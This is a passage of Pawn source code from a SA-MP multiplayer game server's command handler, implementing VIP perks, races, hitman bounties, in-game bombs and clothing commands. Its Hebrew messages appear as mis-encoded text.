		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .сыущ ьф∙·ю∙ сЇўхуф цх VIP Єьщъ ьфщх· ю∙·ю∙");
		if(playerinfo[playerid][vip] < 2) return SendClientMessage(playerid,red," .2 VIP сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°ю·");
		if(playerinfo[playerid][vheal] >= 3) return SendClientMessage(playerid,red," .·хыь ьф∙·ю∙ сЇўхуф цх ∙хс °ў ьрч° ∙·Ўр");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /vheal [id/name] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(id == playerid)
		{
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф срцх° ущ-рэ");
			format(string,sizeof(string)," .ф∙·ю∙· с°щЇхщ ф # %d ∙ьъ (ю·хъ 3) Єь ЄЎюъ",playerinfo[playerid][vheal]);
			SendClientMessage(playerid,green,string);
		}
		else
		{
			if(playerinfo[id][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° Єь ссчщ°· фуюхщх·");
			if(playerinfo[id][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх Єь ∙чўя сюЎс");
			if(playerinfo[id][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх Єь ∙чўя сЇЄщьх·");
			if(playerinfo[id][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх Єь ∙чўя срцх° ущ-рэ");
			format(string,sizeof(string)," .%s ф∙·ю∙· с°щЇхщ ф # %d ∙ьъ (ю·хъ 3) Єь ",GetName(id),playerinfo[playerid][vheal]);
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," .VIP °щЇр рх·ъ срюЎЄх· ыхч ф %s",GetName(playerid));
			SendClientMessage(id,green,string);
		}
		SetPlayerHealth(id,100.0);
		SetPlayerArmour(id,100.0);
		playerinfo[playerid][vheal]++;
		if(playerinfo[playerid][vheal] >= 3) SendClientMessage(playerid,red," .Єу ∙·Ўр /vheal ьр ·хыь ьф∙·ю∙ щх·° сЇўху· ф°щЇхщ");
		return 1;
	}
	if(equal(cmd,"/carjump"))
	{
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .сыущ ьф∙·ю∙ сЇўхуф цх VIP Єьщъ ьфщх· ю∙·ю∙");
		if(playerinfo[playerid][vip] < 2) return SendClientMessage(playerid,red," .2 VIP сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°ю·");
		if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SendClientMessage(playerid,red," .Єьщъ ьфщх· Ёфт сюыхЁщ·");
		if(!IsCar(GetPlayerVehicleID(playerid))) return SendClientMessage(playerid,red," .Єьщъ ьфщх· сюыхЁщ·");
		if(!CanUseCommand(playerid)) return 1;
		new string[M_S], Float:v[3], Float:h, max_ = 3/* * playerinfo[playerid][upgradecmd][lcmdid("/carjump",1)]*/;
		if(playerinfo[playerid][cancarjump] > 0)
		{
			format(string,sizeof(string)," .·хыь ьф∙·ю∙ сЇўхуф фцх °ў сЄху %d ∙Ёщх·",playerinfo[playerid][cancarjump]);
			return SendClientMessage(playerid,red,string);
		}
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd))
		{
			format(string,sizeof(string)," /carjump [height 1 - %d]",max_);
			return SendClientMessage(playerid,white,string);
		}
		if(strval(cmd) < 1 || strval(cmd) > max_) return SendClientMessage(playerid,red," .тхсф ∙тхщ");
		h = floatmul(0.2,float(strval(cmd)));
		playerinfo[playerid][cancarjump] = 3;
		GetVehicleVelocity(GetPlayerVehicleID(playerid),v[0],v[1],v[2]);
		SetVehicleVelocity(GetPlayerVehicleID(playerid),v[0],v[1],v[2] + h,playerid);
		return 1;
	}
	if(equal(cmd,"/qdefence"))
	{
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .сыущ ьф∙·ю∙ сЇўхуф цх VIP Єьщъ ьфщх· ю∙·ю∙");
		if(playerinfo[playerid][vip] < 3) return SendClientMessage(playerid,red," .3 VIP сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°ю·");
		if(!CanUseCommand(playerid)) return 1;
		if(playerinfo[playerid][quicklydefence] > 0) return SendClientMessage(playerid,red," .р·ф ыс° ю∙·ю∙ сф·чюўх· юфщ°ф");
		new s, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /qdefence [seconds] :Ўх°· ф∙щюх∙");
		s = strval(cmd);
		if(s < 1 || s > 120) return SendClientMessage(playerid,red," .юёЇ° ∙Ёщх· ∙тхщ. ющЁщюхэ: 1, юўёщюхэ: 120");
		new c = s * 2;
		if(GetMoney(playerid) < c)
		{
			format(string,sizeof(string)," .ф·чюўх· юфщ°ф ьюёЇ° ф∙Ёщх· ∙ЎщщЁ· Єхьф $%d, рщя ьъ юёЇщў ыёє",c);
			return SendClientMessage(playerid,red,string);
		}
		GiveMoney(playerid,0-c,13);
		playerinfo[playerid][quicklydefence] = s;
		format(string,sizeof(string)," !ўщсь· ф·чюўх· юфщ°ф ь %d ∙Ёщх·",s);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/vrocket"))
	{
		new string[M_S];
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .сыущ ьф∙·ю∙ сЇўхуф цх VIP Єьщъ ьфщх· ю∙·ю∙");
		if(playerinfo[playerid][vip] < 3) return SendClientMessage(playerid,red," .3 VIP сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°ю·");
		if(playerinfo[playerid][vrocket]) return SendClientMessage(playerid,red," .·хыь ьф∙·ю∙ сЇўхуф цх ∙хс °ў ьрч° ∙·Ўр");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /vrocket [id/name] :Ўх°· ф∙щюх∙");
		new id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(playerinfo[id][vip] > 0) return SendClientMessage(playerid,red," .VIP ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх Єь ю∙·ю∙щ");
		playerinfo[playerid][vrocket] = 1;
		CallRemoteFunction("SAM_lunch","d",id);
		format(string,sizeof(string)," .%s ∙ьч· шщь рь",GetName(id));
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .VIP ∙ьч рьщщъ шщь срюЎЄх· ыхч ф %s",GetName(playerid));
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/vsuicide") || equal(cmd,"/vs"))
	{
		if(!CanUseCommand(playerid)) return 1;
		new Float:h;
		if(!playerinfo[playerid][vip]) return SendClientMessage(playerid,red," .сыущ ьф∙·ю∙ сЇўхуф цх VIP Єьщъ ьфщх· ю∙·ю∙");
		if(playerinfo[playerid][vip] < 3) return SendClientMessage(playerid,red," .3 VIP сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· с°ю·");
		if(playerinfo[playerid][vsuicide][1] != -1) return SendClientMessage(playerid,red," .р·ф ыс° ю∙·ю∙ сЇўхуф цх");
		if(GetPlayerVirtualWorld(playerid) != 0 || GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх");
		GetPlayerHealth(playerid,h);
		if(h > 25.0) return SendClientMessage(playerid,red," .ь∙щюх∙ сЇўхуф цх Ў°щыщэ ьфщх· ьъ юўёщюхэ 25%% чщщэ");
		playerinfo[playerid][vsuicide][0] = 0;
		SetTimerPck(playerinfo[playerid][vsuicide][1],"VIPSuicide",800,1,"d",playerid);
		SendClientMessage(playerid,green," .VIP сщЎЄ· ф·рсух· ∙ь ыхч ф");
		return 1;
	}
	if(equal(cmd,"/testsound"))
	{
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /testsound [sound id] :Ўх°· ф∙щюх∙");
		PlaySound(playerid,strval(cmd));
		return 1;
	}
	if(equal(cmd,"/refreshgproperties")) return RefreshGProperties();
	if(equal(cmd,"/refreshpship")) return ReloadPirateShip();
	if(equal(cmd,"/testexp") && IsPlayerMAdmin(playerid))
	{
		new id;
		cmd = strtok(cmdtext, idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /testexp [explosion id] [rad] :Ўх°· ф∙щюх∙");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		id = strval(cmd), cmd = strtok(cmdtext,idx);
		CreateExplosion(p[0]+15.0,p[1],p[2],id,floatstr(cmd));
		return 1;
	}
	for(new i = 0; i < sizeof(SRaceTypes); i++) if(equal(cmd,SRaceTypes[i][srCommand]))
	{
		new string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			format(string,sizeof(string)," %s [action] :Ўх°ъ ф∙щюх∙",SRaceTypes[i][srCommand]);
			SendClientMessage(playerid,white,string);
			format(string,sizeof(string)," %s state :фЁхычщ %s сущў· юЎс ющ°хї ф",SRaceTypes[i][srCommand],SRaceTypes[i][srName]);
			SendClientMessage(playerid,white,string);
			format(string,sizeof(string)," %s join :%s фЎш°Їх· ь",SRaceTypes[i][srCommand],SRaceTypes[i][srName]);
			SendClientMessage(playerid,white,string);
			format(string,sizeof(string)," %s quit :%s Ї°щ∙ф ю",SRaceTypes[i][srCommand],SRaceTypes[i][srName]);
			SendClientMessage(playerid,white,string);
			if(IsPlayerMAdmin(playerid))
			{
				format(string,sizeof(string)," %s start :%s ф·чь· ющ°хї",SRaceTypes[i][srCommand],SRaceTypes[i][srName]);
				SendClientMessage(playerid,white,string);
				format(string,sizeof(string)," %s end [reason] :фЁхычщ %s ёщхэ ющ°хї ф",SRaceTypes[i][srCommand],SRaceTypes[i][srName]);
				SendClientMessage(playerid,white,string);
			}
			return 1;
		}
		if(equal(cmd,"state"))
		{
			if(sraceinfo[0] && sraceinfo[5] == i)
				if(sraceinfo[2] > 1) format(string,sizeof(string)," .хфхр щ·чщь сЄху %d ∙Ёщх· %s щ∙ ы°тЄ ющ°хї",sraceinfo[2],SRaceTypes[i][srName]);
				else format(string,sizeof(string)," .хфхр ыс° ф·чщь %s щ∙ ы°тЄ ющ°хї",SRaceTypes[i][srName]);
			else format(string,sizeof(string)," .%s рщя ы°тЄ ющ°хї",SRaceTypes[i][srName]);
			SendClientMessage(playerid,sraceinfo[0] ? green : red,string);
		}
		else if(equal(cmd,"join"))
		{
			if(!sraceinfo[0] || sraceinfo[5] != i)
			{
				format(string,sizeof(string)," .ы°тЄ %s рщя ющ°хї",SRaceTypes[i][srName]);
				return SendClientMessage(playerid,red,string);
			}
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф ссчщ°· фуюхщх·");
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф сюЎс");
			if(playerinfo[playerid][waitsrace]) return SendClientMessage(playerid,red," .фЇЄщьх· ··чщь сЄху ыюф ∙Ёщх·, рЁр фю·я сёсьЁх·");
			if(playerinfo[playerid][insrace] && sraceinfo[5] == i)
			{
				format(string,sizeof(string)," .%s р·ф ыс° сющ°хї",SRaceTypes[i][srName]);
				return SendClientMessage(playerid,red,string);
			}
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .р·ф ыс° сЇЄщьх·");
			if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьфЎш°є ьЇЄщьх· ыр∙° р·ф срцх° ущ-рэ");
			if(!CanUseCommand(playerid)) return 1;
			if(sraceinfo[1] >= CountOfSRaceTypeInArray(SRaceTypes[sraceinfo[5]][srPlace],0))
			{
				format(string,sizeof(string)," .·Їхёщэ %s ыь фюўхюх· с",SRaceTypes[i][srName]);
				return SendClientMessage(playerid,red,string);
			}
			if(sraceinfo[2] <= 3) return SendClientMessage(playerid,red," .цюя ффЎш°Їх· Єс°");
			if(GetMoney(playerid) < join_act) return SendClientMessage(playerid,red," .рщя ьъ юёЇщў ыёє, фючщ° ьфЎш°Їх· ьЇЄщьх· фхр " #join_act "$");
			GiveMoney(playerid,0-join_act,25);
			playerinfo[playerid][waitsrace] = 1;
			playerinfo[i][sraceid] = sraceinfo[1];
			sraceinfo[1]++;
			format(string,sizeof(string)," - !%s фЎш°є ь %s",SRaceTypes[i][srName],GetName(playerid));
			SendClientMessageToAll(green,string);
			format(string,sizeof(string)," Х Х :%s фЎш°Ї· ьющ°хї Х Х",SRaceTypes[i][srName]);
			SendClientMessage(playerid,lightblue,string);
			SendClientMessage(playerid,lightyellow," - Єьщъ ьЄўхс рч°щ фЎ'ўЇхщЁшщэ ∙щыхьщэ ьф°рх· ыЄщтхьщэ рухющэ Єь фруюф, сющэ рх срхщ°");
			SendClientMessage(playerid,lightyellow," - ч∙хс ∙·Єсх° у°ъ ыь рчу юфЎ'ўЇхщЁшщэ фыщ юф° ∙·хыь Єу ьёщхэ фющ°хї");
			format(string,sizeof(string)," Х фщЁъ ю·ч°ф юёЇ° " @c(white) "#%d",sraceinfo[1]);
			SendClientMessage(playerid,yellow,string);
			SendClientMessage(playerid,purple," ╗ !сфЎьчф");
		}
		else if(equal(cmd,"quit"))
		{
			if(!sraceinfo[0] || sraceinfo[5] != i)
			{
				format(string,sizeof(string)," .ы°тЄ %s рщя ющ°хї",SRaceTypes[i][srName]);
				return SendClientMessage(playerid,red,string);
			}
			if(!playerinfo[playerid][insrace])
			{
				format(string,sizeof(string)," .%s р·ф ьр сющ°хї",SRaceTypes[i][srName]);
				return SendClientMessage(playerid,red,string);
			}
			format(string,sizeof(string)," .%s Ї°∙· юфющ°хї",SRaceTypes[i][srName]);
			SendClientMessage(playerid,green,string);
			format(string,sizeof(string)," - !%s Ї°∙ ю %s",SRaceTypes[i][srName],GetName(playerid));
			SendClientMessageToAll(red,string);
			OutOfActivity(playerid);
		}
		else if(equal(cmd,"start"))
		{
			#if trainings == false
				if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			#endif
			if(sraceinfo[0] && sraceinfo[5] == i)
			{
				format(string,sizeof(string)," .%s ыс° щ∙ ЇЄщьх· юёхт",SRaceTypes[i][srName]);
				return SendClientMessage(playerid,red,string);
			}
			if(thereIsAct) return SendClientMessage(playerid,red," .ыс° щ∙ ЇЄщьх· ЇхЄь·");
			StartSRace(i);
		}
		else if(equal(cmd,"end"))
		{
			new reason[256];
			if(!IsPlayerMAdmin(playerid)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· рующя сыущ ьф∙·ю∙ сЇЄхьф цх");
			if(!sraceinfo[0] || sraceinfo[5] != i)
			{
				format(string,sizeof(string)," .%s рщя ы°тЄ ющ°хї юёхт",SRaceTypes[i][srName]);
				return SendClientMessage(playerid,red,string);
			}
			reason = strrest(cmdtext,idx);
			if(!strlen(reason)) reason = "рщя";
			EndSRace(reason,playerid);
		}
		else
		{
			format(string,sizeof(string)," .∙тхщф %s рЇ∙°х·",SRaceTypes[i][srName]);
			SendClientMessage(playerid,red,string);
		}
		return 1;
	}
	if(equal(cmd,"/hitman"))
	{
		if(!playerinfo[playerid][canhitman]) return SendClientMessage(playerid,red," .·хыь ьсЎЄ р· фЇўхуф фцх ∙хс сў°хс");
		new id, amount, string[M_S], cmd2[M_S];
		cmd = strtok(cmdtext,idx), cmd2 = strtok(cmdtext,idx);
		if(!strlen(cmd) || !strlen(cmd2) || !IsNumeric(cmd2)) return SendClientMessage(playerid,white," /hitman [id] [amount] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(id == playerid) return SendClientMessage(playerid,red," .ьр Ёщ·я ь∙щэ ыёє Єь ЄЎюъ");
		amount = strval(cmd2);
		if(amount < 200 || amount > GetMoney(playerid)) return SendClientMessage(playerid,red," .юёЇ° ыёє ∙тхщ");
		playerinfo[id][hitman] += amount;
		GiveMoney(playerid,0-amount,5);
		format(string,sizeof(string)," .%s ∙ю· %d$ Єь",GetName(id),amount);
		SendClientMessage(playerid,green,string);
		format(string,sizeof(string)," .∙э Єьщъ %d$ %s",amount,GetName(playerid));
		SendClientMessage(id,red,string);
		format(string,sizeof(string)," .хыЄ· щ∙ Єьщх %d$ %s ∙э %d$ Єь %s",playerinfo[id][hitman],GetName(id),amount,GetName(playerid));
		for(new i=0;i<MAX_PLAYERS_;i++) if(IsPlayerConnected(i)) if(i != playerid && i != id) SendClientMessage(i,lightblue,string);
		playerinfo[playerid][canhitman] = 0;
		SetTimerEx("CanHitman",20000,0,"ii",playerid,0);
		return 1;
	}
	if(equal(cmd,"/bounty"))
	{
		new id, string[M_S];
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /bounty [id] :Ўх°· ф∙щюх∙");
		id = ReturnUser(cmd,playerid);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .рщщущ ∙тхщ");
		if(id == playerid)
		{
			format(string,sizeof(string)," .щ∙ Єьщъ %d$",playerinfo[playerid][hitman]);
			SendClientMessage(playerid,green,playerinfo[playerid][hitman] == 0 ? (" .рщя Єьщъ ыёє") : (string));
		}
		else
		{
			format(string,sizeof(string)," .%s щ∙ %d$ Єь",GetName(id),playerinfo[id][hitman]);
			SendClientMessage(playerid,green,playerinfo[id][hitman] == 0 ? (" .рщя ыёє Єь ф∙чўя ∙сч°·") : (string));
		}
		return 1;
	}
	if(equal(cmd,"/buybomb"))
	{
		if(!IsPlayerInStore(playerid,store_bombs)) return SendClientMessage(playerid,red," .сыущ ьсЎЄ р· фЇўхуф фцх Єьщъ ьфщх· счЁх· фЇЎЎх·");
 		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф ссчщ°· фуюхщх·");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сЇЄщьх·");
		if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф срцх° ущ-рэ");
		if(playerinfo[playerid][frozen][0]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф ўЇхр");
		if(playerinfo[playerid][bomb] > 0) return SendClientMessage(playerid,red," .ыс° щ∙ ьъ ЇЎЎф");
		ShowMenuForPlayer(bombshop,playerid);
		SetFreeze(playerid,1);
		SendClientMessage(playerid,lightblue," ~~~ :с°хъ фср ьчЁх· фЇЎЎх· ~~~");
		SendClientMessage(playerid,yellow," - Help ьфЎт· ющуЄ рхух· фЇЎЎх·, ьчї Єь");
		SendClientMessage(playerid,yellow," - сюўьу· Enter ьщЎщрф юфчЁх· ьчї Єь фыЇ·х°");
		return 1;
	}
	if(equal(cmd,"/usebomb"))
	{
		if(!playerinfo[playerid][bomb]) return SendClientMessage(playerid,red," .рщя ьъ ЇЎЎф");
 		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф ссчщ°· фуюхщх·");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сюЎс");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф сЇЄщьх·");
		if(playerinfo[playerid][dmzone] != dmz_none || playerinfo[playerid][tdmzone] != tdmz_none) return SendClientMessage(playerid,red," .ьр Ёщ·я ьф∙·ю∙ сЇўхуф цх ыр∙° р·ф срцх° ущ-рэ");
		if(GetPlayerInterior(playerid) != 0) return SendClientMessage(playerid,red," .рщЁъ щыхь ьсЎЄ р· фЇўхуф фцх сющўхюъ фЁхычщ");
		new Float:p[3], pid[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		GetXYInFrontOfPlayer(playerid,p[0],p[1],1.0);
		switch(playerinfo[playerid][bomb])
		{
			case 1: // Bomb
			{
				SendClientMessage(playerid,red," !фЁч· ЇЎЎф хфщр ··ЇхЎї сЄху 10 ∙Ёщх·");
				ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.1,0,1,1,1,1);
				pid[0] = CreateSObject(1654,p[0],p[1],p[2],0.0,0.0,0.0);
				SetTimerEx("Explosion",10000,0,"iiiii",playerid,playerinfo[playerid][bomb],pid[0],-1,-1);
			}
			case 2: // Super bomb
			{
				SendClientMessage(playerid,red," !фЁч· ёхЇ° ЇЎЎф хфщр ··ЇхЎї сЄху 10 ∙Ёщх·");
				ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.1,0,1,1,1,1);
				pid[0] = CreateSObject(1654,p[0]+1.0,p[1],p[2],0.0,0.0,0.0);
				pid[1] = CreateSObject(1654,p[0]-1.0,p[1],p[2],0.0,0.0,0.0);
				pid[2] = CreateSObject(1654,p[0],p[1],p[2]+1.0,0.0,0.0,0.0);
				SetTimerEx("Explosion",10000,0,"iiiii",playerid,playerinfo[playerid][bomb],pid[0],pid[1],pid[2]);
			}
			case 3: // Time bomb
			{
				cmd = strtok(cmdtext,idx);
				if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /usebomb [seconds] :юыщххя ∙щ∙ ьъ ЇЎЎф Єь цюя, Єьщъ ьфўьщу юёЇ° ∙Ёщх·");
				new string[M_S], time = strval(cmd);
				if(time < 1 || time > 60) return SendClientMessage(playerid,red," .юёЇ° ∙Ёщх· тухь рх ўшя юущ");
				format(string,sizeof(string)," !фЁч· ЇЎЎ· цюя хфщр ··ЇхЎї сЄху %d ∙Ёщх·",time);
				SendClientMessage(playerid,red,time? (" !фЁч· ЇЎЎ· цюя хфщр ··ЇхЎї сЄху ∙Ёщщф"):(string));
				ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.1,0,1,1,1,1);
				pid[0] = CreateSObject(1654,p[0],p[1],p[2],0.0,0.0,0.0);
				SetTimerEx("Explosion",time*1000,0,"iiiii",playerid,playerinfo[playerid][bomb],pid[0],-1,-1);
			}
			case 4: // Invisible bomb
			{
				SendClientMessage(playerid,red," !фЁч· ЇЎЎф сь·щ Ё°р· хфщр ··ЇхЎї сЄху 10 ∙Ёщх·");
				ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.1,0,1,1,1,1);
				SetTimerEx("Explosion",10000,0,"iiiii",playerid,playerinfo[playerid][bomb],-1,-1,-1);
			}
			case 5: // Kuriza
			{
				SendClientMessage(playerid,red," !ЇЎЎ· ўх°щЎф ·щЇхь ыря ·хъ ыюф ∙Ёщх·");
				ApplyAnimation(playerid,"BOMBER","BOM_Plant",4.1,0,1,1,1,1);
				pid[0] = CreateObject(16776,p[0],p[1],p[2]+50.0,0.0,0.0,0.0);
				new time = MoveObject(pid[0],p[0],p[1],p[2],20.0);
				DestroyObject(pid[0]);
				pid[0] = CreateSObject(16776,p[0],p[1],p[2]+50.0,0.0,0.0,0.0);
				MoveSObject(pid[0],p[0],p[1],p[2],20.0);
				SetTimerEx("Explosion",time,0,"iiiii",playerid,playerinfo[playerid][bomb],pid[0],-1,-1);
			}
			case 6: // Atom bomb
			{
				SendClientMessage(playerid,red," !фЁч· ЇЎЎ· ршхэ хфщр ··ЇхЎї сЄху 30 ∙Ёщх·");
				SetTimerEx("Explosion",30000,0,"iiiii",playerid,playerinfo[playerid][bomb],-1,-1,-1);
				playerinfo[playerid][bombtime] = 0;
			}
			case 7: // Hydrogen bomb
			{
				SendClientMessage(playerid,red," !фЁч· ЇЎЎ· ющюя хфщр ··ЇхЎї сЄху 30 ∙Ёщх·");
				pid[0] = CreateSObject(3786,p[0],p[1],p[2],0.0,0.0,0.0);
				SetTimerEx("Explosion",30000,0,"iiiii",playerid,playerinfo[playerid][bomb],pid[0],-1,-1);
				playerinfo[playerid][bombtime] = 0;
			}
		}
		for(new i=0;i<3;i++) playerinfo[playerid][bombpos][i] = p[i];
		return 1;
	}
	if(equal(cmd,"/myskin"))
	{
		if(!IsPlayerInStore(playerid,store_clothes)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· фстущэ сыущ ьсЎЄ ЇЄхьф цх");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /myskin [skin id] :Ўх°· ф∙щюх∙");
		new sskin = strval(cmd), string[M_S];
		if(!IsValidSkin(sskin)) return SendClientMessage(playerid,red," .юёЇ° уюх· ∙тхщ");
		SetPlayerSkin(playerid,sskin);
		format(string,sizeof(string)," .∙щЁщ· р· фуюх· ∙ьъ ьуюх· юёЇ° %d",sskin);
		SendClientMessage(playerid,green,string);
		return 1;
	}
	if(equal(cmd,"/class"))
	{
		if(!CanBeTeleported(playerid)) return SendClientMessage(playerid, red, " .рщЁъ щыхь ьф∙·ю∙ сЇўхуф цх сюЎсъ фЁхычщ");
		ForceClassSelection(playerid);
		SetPlayerHealth(playerid,0.0);
		playerinfo[playerid][reqclass] = 1;
		SendClientMessage(playerid,green," .фчц°· р· ЄЎюъ ьюёъ счщ°· фуюхщх·");
		return 1;
	}
	if(equal(cmd,"/csrandom"))
	{
		new newpic = playerinfo[playerid][pic];
		switch(playerinfo[playerid][setting][setting_classselection])
		{
			case 1: return SendClientMessage(playerid,red," .·юхЁ· юёъ счщ°· фуюхщх· ∙ьъ ўсхЄф");
			case 2:
			{
				do newpic = random(sizeof(Pictures));
				while newpic == playerinfo[playerid][pic];
			}
			case 3:
			{
				do newpic = random(sizeof(Pictures2));
				while newpic == playerinfo[playerid][pic];
			}
		}
		playerinfo[playerid][pic] = newpic;
		SendClientMessage(playerid,green," .·юхЁ· юёъ счщ°· фуюхщх· ∙ьъ ф∙·Ё·ф");
		return 1;
	}
	if(equal(cmd,"/clothes"))
	{
		if(!IsPlayerInStore(playerid,store_clothes)) return SendClientMessage(playerid,red," .Єьщъ ьфщх· счЁх· фстущэ сыущ ьсЎЄ ЇЄхьф цх");
		RefreshClothes(playerid);
		new string[400];
		if(playerinfo[playerid][clothes] == -1) format(string,sizeof(string),@c(yellow) "ЄщЎхс #1: " @c(white) "ььр");
		else format(string,sizeof(string),@c(yellow) "ЄщЎхс #1: " @c(white) "%s -> %s",ClothesCategories[Clothes[playerinfo[playerid][clothes]][cltCategory]],Clothes[playerinfo[playerid][clothes]][cltName]);
		if(playerinfo[playerid][clothes2] == -1) format(string,sizeof(string),"%s\n" @c(yellow) "ЄщЎхс #2: " @c(white) "ььр",string);
		else format(string,sizeof(string),"%s\n" @c(yellow) "ЄщЎхс #2: " @c(white) "%s -> %s",string,ClothesCategories[Clothes[playerinfo[playerid][clothes2]][cltCategory]],Clothes[playerinfo[playerid][clothes2]][cltName]);
		format(string,sizeof(string),"%s\n" @c(red) "Ёщўхщ ЄщЎхс",string);
		format(string,sizeof(string),"%s\n" @c(purple) "уюх· Ёхычщ·: " @c(lightpurple) "%d",string,GetPlayerSkin(playerid));
		if(playerinfo[playerid][skin] != -1) format(string,sizeof(string),"%s\n" @c(purple) "чц°ф ьуюх· ∙юх°ф: " @c(lightpurple) "%d",string,playerinfo[playerid][skin]);
		else format(string,sizeof(string),"%s\n" @c(purple) "чц°ф ьуюх· ∙юх°ф: " @c(lightpurple) "рщя",string);
		ShowPlayerDialog(playerid,dialog_clothesmenu,DIALOG_STYLE_LIST,@c(lightblue) "чЁх· стущэ",string,"счщ°ф","щЎщрф");
		return 1;
	}
	if(equal(cmd,"/save2") && IsPlayerMAdmin(playerid))
	{
		cmd = strrest(cmdtext,idx);
